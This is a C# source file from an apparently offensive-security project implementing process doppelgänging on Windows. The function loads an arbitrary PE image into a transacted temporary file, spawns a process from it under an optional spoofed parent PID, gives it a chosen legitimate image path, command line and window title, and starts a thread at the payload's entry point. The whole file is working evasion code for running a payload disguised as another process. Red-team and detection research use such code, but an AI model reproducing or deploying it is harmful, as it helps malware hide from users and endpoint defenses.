using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Threading;
using ProcessDoppelgaenging.Interop;

namespace ProcessDoppelgaenging.Library
{
    using NTSTATUS = Int32;

    internal class Modules
    {
        public static bool CreateDoppelgaengingProcess(
            byte[] imageData,
            string commandLine,
            int ppid,
            string windowTitle)
        {
            NTSTATUS ntstatus;
            IntPtr hTransactedSection;
            IntPtr hDoppelgaengingProcess;
            IntPtr pPeb;
            IntPtr pImageBase;
            IntPtr pRemoteEntryPoint;
            IntPtr pRemoteProcessParameters;
            uint nEntryPointOffset;
            string archImage;
            string imagePathName;
            string tempFilePath = Path.GetTempFileName();

            if (Environment.Is64BitOperatingSystem && (IntPtr.Size != 8))
            {
                Console.WriteLine("[!] In 64bit OS, should be built as 64bit binary.");

                return false;
            }
            else if (!Environment.Is64BitOperatingSystem && (IntPtr.Size != 4))
            {
                Console.WriteLine("[!] In 32bit OS, should be built as 32bit binary.");

                return false;
            }

            Console.WriteLine("[>] Loading image data.");

            try
            {
                using (var peImage = new PeFile(imageData))
                {
                    archImage = peImage.GetArchitecture();
                    nEntryPointOffset = peImage.GetAddressOfEntryPoint();
                }
            }
            catch
            {
                Console.WriteLine("[!] Failed to load image data.");

                return false;
            }

            Console.WriteLine("[+] Image data is loaded successfully.");
            Console.WriteLine("    [*] Architecture : {0}", archImage);

            if (Environment.Is64BitOperatingSystem &&
                (string.Compare(archImage, "x64", StringComparison.OrdinalIgnoreCase) != 0))
            {
                Console.WriteLine("[-] Should be x64 PE data in 64bit OS.");

                return false;
            }
            else if (!Environment.Is64BitOperatingSystem &&
                (string.Compare(archImage, "x86", StringComparison.OrdinalIgnoreCase) != 0))
            {
                Console.WriteLine("[-] Should be x86 PE data in 32bit OS.");

                return false;
            }

            Console.WriteLine("[>] Trying to resolve image file path.");

            imagePathName = Helpers.ResolveImageNamePath(commandLine);

            if (string.IsNullOrEmpty(imagePathName))
            {
                Console.WriteLine("[-] Failed to resolve target image path.");

                return false;
            }
            else
            {
                Console.WriteLine("[+] Image file is resolved successfully.");
                Console.WriteLine("    [*] Image File Path : {0}", imagePathName);
            }

            Console.WriteLine("[>] Trying to create transacted file.");
            Console.WriteLine("    [*] File Path : {0}", tempFilePath);

            hTransactedSection = Utilities.CreateTransactedSection(
                tempFilePath,
                imageData);

            if (hTransactedSection == Win32Consts.INVALID_HANDLE_VALUE)
            {
                try
                {
                    if (File.Exists(tempFilePath))
                        File.Delete(tempFilePath);
                }
                catch
                {
                    Console.WriteLine("[!] Failed to delete \"{0}\". Delete it mannually.", tempFilePath);
                }

                return false;
            }

            hDoppelgaengingProcess = Utilities.CreateTransactedProcess(
                hTransactedSection,
                ppid);
            NativeMethods.NtClose(hTransactedSection);

            if (hDoppelgaengingProcess == IntPtr.Zero)
            {
                try
                {
                    if (File.Exists(tempFilePath))
                        File.Delete(tempFilePath);
                }
                catch
                {
                    Console.WriteLine("[!] Failed to delete \"{0}\". Delete it mannually.", tempFilePath);
                }

                return false;
            }

            Console.WriteLine("[>] Trying to get ntdll!_PEB address for the doppelgaenging process.");

            if (!Helpers.GetProcessBasicInformation(
                hDoppelgaengingProcess,
                out PROCESS_BASIC_INFORMATION pbi))
            {
                Console.WriteLine("[-] Failed to get ntdll!_PEB address for the doppelgaenging process.");

                try
                {
                    if (File.Exists(tempFilePath))
                        File.Delete(tempFilePath);
                }
                catch
                {
                    Console.WriteLine("[!] Failed to delete \"{0}\". Delete it mannually.", tempFilePath);
                }

                NativeMethods.NtTerminateProcess(hDoppelgaengingProcess, Win32Consts.STATUS_SUCCESS);

                return false;
            }
            else
            {
                pPeb = pbi.PebBaseAddress;
                Console.WriteLine("[+] Got doppelgaenging process basic information.");
                Console.WriteLine("    [*] ntdll!_PEB : 0x{0}", pPeb.ToString((IntPtr.Size == 8) ? "X16" : "X8"));
                Console.WriteLine("    [*] Process ID : {0}", pbi.UniqueProcessId);
            }

            Console.WriteLine("[>] Trying to get image base address for the doppelgaenging process.");

            pImageBase = Helpers.GetImageBaseAddress(hDoppelgaengingProcess, pPeb);

            if (pImageBase == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to get image base address for the doppelgaenging process.");

                try
                {
                    if (File.Exists(tempFilePath))
                        File.Delete(tempFilePath);
                }
                catch
                {
                    Console.WriteLine("[!] Failed to delete \"{0}\". Delete it mannually.", tempFilePath);
                }

                NativeMethods.NtTerminateProcess(hDoppelgaengingProcess, Win32Consts.STATUS_SUCCESS);

                return false;
            }
            else
            {
                Console.WriteLine("[+] Got image base address for the doppelgaenging process.");
                Console.WriteLine("    [*] Image Base Address : 0x{0}", pImageBase.ToString((IntPtr.Size == 8) ? "X16" : "X8"));
            }

            pRemoteEntryPoint = new IntPtr(pImageBase.ToInt64() + nEntryPointOffset);

            Console.WriteLine("[>] Trying to set process parameters to the doppelgaenging process.");

            pRemoteProcessParameters = Utilities.SetProcessParameters(
                hDoppelgaengingProcess,
                imagePathName,
                commandLine,
                Environment.CurrentDirectory,
                windowTitle);

            if (pRemoteProcessParameters == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to set process parameters.");

                try
                {
                    if (File.Exists(tempFilePath))
                        File.Delete(tempFilePath);
                }
                catch
                {
                    Console.WriteLine("[!] Failed to delete \"{0}\". Delete it mannually.", tempFilePath);
                }

                NativeMethods.NtTerminateProcess(hDoppelgaengingProcess, Win32Consts.STATUS_SUCCESS);

                return false;
            }
            else
            {
                Console.WriteLine("[+] Process parameters are set successfully.");
            }

            Console.WriteLine("[>] Trying to start doppelgaenging process thread.");

            ntstatus = NativeMethods.NtCreateThreadEx(
                out IntPtr hThread,
                ACCESS_MASK.THREAD_ALL_ACCESS,
                IntPtr.Zero,
                hDoppelgaengingProcess,
                pRemoteEntryPoint,
                IntPtr.Zero,
                false,
                0,
                0,
                0,
                IntPtr.Zero);

            if (ntstatus != Win32Consts.STATUS_SUCCESS)
            {
                Console.WriteLine("[-] Failed to create thread.");
                Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
                Console.WriteLine("[*] In newer version Windows OS (> 1809), this technique may be blocked by kernel protection.");

                NativeMethods.NtTerminateProcess(hDoppelgaengingProcess, Win32Consts.STATUS_SUCCESS);
            }
            else
            {
                Console.WriteLine("[+] Thread is resumed successfully.");
            }

            NativeMethods.NtClose(hThread);
            NativeMethods.NtClose(hDoppelgaengingProcess);

            try
            {
                if (File.Exists(tempFilePath))
                    File.Delete(tempFilePath);
            }
            catch
            {
                Console.WriteLine("[!] Failed to delete \"{0}\". Delete it mannually.", tempFilePath);
            }

            return (ntstatus == Win32Consts.STATUS_SUCCESS);
        }
    }
}
